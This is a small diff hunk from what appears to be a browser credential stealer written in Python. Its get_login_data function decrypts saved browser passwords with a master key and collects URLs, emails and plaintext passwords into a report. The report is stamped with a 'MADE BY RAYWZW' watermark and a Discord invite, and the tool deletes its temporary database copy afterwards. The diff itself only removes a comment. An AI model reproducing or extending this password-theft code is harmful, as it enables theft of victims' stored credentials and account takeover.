@@ -53,7 +53,7 @@ def get_login_data(path: str, profile: str, master_key):
         if row[0] and row[1] and row[2]:
             password = decrypt_password(row[2], master_key)
             result += f"Browser: {profile}\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}\n"
-            result += "------------MADE BY RAYWZW--------------\n"  # Add watermark after each entry
+            result += "------------MADE BY RAYWZW--------------\n"
     conn.close()
     os.remove(temp_login_db)
     result += f"\n{discordinv}"
